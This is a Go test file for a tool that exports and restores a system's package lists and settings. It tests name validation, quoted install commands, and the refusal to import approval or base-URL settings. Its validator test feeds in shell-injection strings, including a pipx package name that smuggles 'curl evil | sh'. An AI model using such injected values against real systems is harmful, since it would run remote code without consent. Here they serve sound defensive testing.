package blueprint

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/lcajigasm/omega/internal/config"
	"github.com/lcajigasm/omega/internal/runner"
)

// fake replaces the package managers: which exist, and what each command
// answers. It returns the commands that ran.
func fake(t *testing.T, tools string, answer func(command string) runner.Result) *[]string {
	t.Helper()
	oldHas, oldRun := has, run
	t.Cleanup(func() { has, run = oldHas, oldRun })
	var ran []string
	has = func(bin string) bool { return strings.Contains(" "+tools+" ", " "+bin+" ") }
	run = func(_ context.Context, command string, _ time.Duration, _ func(string)) runner.Result {
		ran = append(ran, command)
		if answer == nil {
			return runner.Result{}
		}
		return answer(command)
	}
	return &ran
}

// The export keeps the scope of an npm package, says what it could not
// list, and writes a file only its owner can read.
func TestExport(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	fake(t, "brew npm", func(command string) runner.Result {
		switch {
		case strings.HasPrefix(command, "brew leaves"):
			return runner.Result{Output: "git\njq\n"}
		case strings.HasPrefix(command, "brew list --cask"):
			return runner.Result{ExitCode: 1, TimedOut: true}
		case strings.HasPrefix(command, "npm list"):
			return runner.Result{Output: "/opt/homebrew/lib\n/opt/homebrew/lib/node_modules/@anthropic-ai/claude-code\n" +
				"/opt/homebrew/lib/node_modules/npm\n/opt/homebrew/lib/node_modules/typescript\n"}
		}
		return runner.Result{}
	})
	out := filepath.Join(t.TempDir(), "blueprint.json")
	bp, err := Export(context.Background(), out)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(bp.Homebrew, ",") != "git,jq" {
		t.Errorf("formulae: %v", bp.Homebrew)
	}
	if strings.Join(bp.NpmGlobal, ",") != "@anthropic-ai/claude-code,typescript" {
		t.Errorf("npm packages: %v", bp.NpmGlobal)
	}
	if len(bp.Unlisted) != 1 || !strings.Contains(bp.Unlisted[0], "casks") || !strings.Contains(bp.Unlisted[0], "timed out") {
		t.Errorf("the failed listing is not reported: %v", bp.Unlisted)
	}
	if goos != "windows" {
		if fi, err := os.Stat(out); err != nil || fi.Mode().Perm() != 0o600 {
			t.Errorf("the file is not private: %v %v", fi.Mode(), err)
		}
	}
	// What was exported can be read back.
	if _, err := Load(out); err != nil {
		t.Errorf("the export does not load: %v", err)
	}
}

func TestNpmName(t *testing.T) {
	for in, want := range map[string]string{
		"/usr/lib":                                 "",
		"/usr/lib/node_modules/npm":                "",
		"/usr/lib/node_modules/typescript":         "typescript",
		"/usr/lib/node_modules/@scope/pkg":         "@scope/pkg",
		`C:\Users\u\AppData\npm\node_modules\@s\p`: "@s/p",
	} {
		if got := npmName(in); got != want {
			t.Errorf("npmName(%q) = %q, want %q", in, got, want)
		}
	}
}

// A name that is not a plain package name refuses the whole file.
func TestLoadRefusesWhatIsNotAName(t *testing.T) {
	for _, ok := range []string{"git", "@scope/pkg", "python@3.12", "gcc-13", "c++", "homebrew/cask/firefox", "a_b.c"} {
		if !ValidName(ok) {
			t.Errorf("%q was refused", ok)
		}
	}
	for _, bad := range []string{"", "-g", "--help", "a b", "a;b", "a|b", "a&b", "$(x)", "`x`", "a>b", "a'b", `a"b`, "a\nb", "$HOME", "a*"} {
		if ValidName(bad) {
			t.Errorf("%q was accepted", bad)
		}
	}
	file := filepath.Join(t.TempDir(), "bp.json")
	os.WriteFile(file, []byte(`{"homebrew":["git"],"pipx_packages":["black; curl evil | sh"]}`), 0o600)
	if _, err := Load(file); err == nil || !strings.Contains(err.Error(), "pipx_packages") {
		t.Errorf("Load: %v", err)
	}
}

// The plan quotes every name, leaves out what has no package manager here,
// and a failed install is counted instead of thrown away.
func TestPlanAndApply(t *testing.T) {
	ran := fake(t, "brew npm", func(command string) runner.Result {
		if strings.HasPrefix(command, "npm ") {
			return runner.Result{ExitCode: 1}
		}
		return runner.Result{}
	})
	bp := &SystemBlueprint{Homebrew: []string{"git", "jq"}, Casks: []string{"firefox"}, NpmGlobal: []string{"@scope/pkg"}, PipxPackages: []string{"black"}}
	actions, skipped := bp.Plan()
	var cmds []string
	for _, a := range actions {
		cmds = append(cmds, a.Command)
	}
	want := "brew install 'git' 'jq'|brew install --cask 'firefox'|npm install -g '@scope/pkg'"
	if strings.Join(cmds, "|") != want {
		t.Errorf("plan: %q", cmds)
	}
	if len(skipped) != 1 || !strings.Contains(skipped[0], "pipx") {
		t.Errorf("skipped: %v", skipped)
	}
	if len(*ran) != 0 {
		t.Fatalf("the plan ran something: %v", *ran)
	}
	failed := Apply(context.Background(), actions, nil)
	if len(*ran) != 3 || len(failed) != 1 || !strings.HasPrefix(failed[0].Command, "npm ") {
		t.Errorf("ran %v, failed %v", *ran, failed)
	}
}

// approval and base_url never come from a blueprint, and the file that was
// there is kept.
func TestRestoredConfig(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	current := config.Default()
	current.Providers["ollama"] = config.ProviderConfig{BaseURL: "http://localhost:11434/v1"}
	if err := current.Save(); err != nil {
		t.Fatal(err)
	}
	theirs := config.Default()
	theirs.Approval = config.ApproveNever
	theirs.Language = "fr"
	theirs.Providers["custom"] = config.ProviderConfig{Model: "m", BaseURL: "http://elsewhere.example/v1"}
	bp := &SystemBlueprint{Config: theirs}

	cfg, kept := bp.RestoredConfig(current)
	if cfg.Approval != config.ApproveDangerous || cfg.Language != "fr" {
		t.Errorf("restored: %+v", cfg)
	}
	if cfg.BaseURLFor("custom") != "" || cfg.Providers["custom"].Model != "m" || cfg.BaseURLFor("ollama") != "http://localhost:11434/v1" {
		t.Errorf("providers: %+v", cfg.Providers)
	}
	if len(kept) != 2 {
		t.Errorf("kept: %v", kept)
	}
	if theirs.Approval != config.ApproveNever {
		t.Error("the blueprint itself was changed")
	}
	backup, err := SaveConfig(cfg)
	if err != nil || backup != config.Path()+".bak" {
		t.Fatalf("SaveConfig: %q %v", backup, err)
	}
	if b, _ := os.ReadFile(backup); !strings.Contains(string(b), "localhost:11434") {
		t.Errorf("the backup is not the previous file: %s", b)
	}
	if cfg, nothing := (&SystemBlueprint{}).RestoredConfig(current); cfg != nil || nothing != nil {
		t.Error("a blueprint without settings restored some")
	}
}
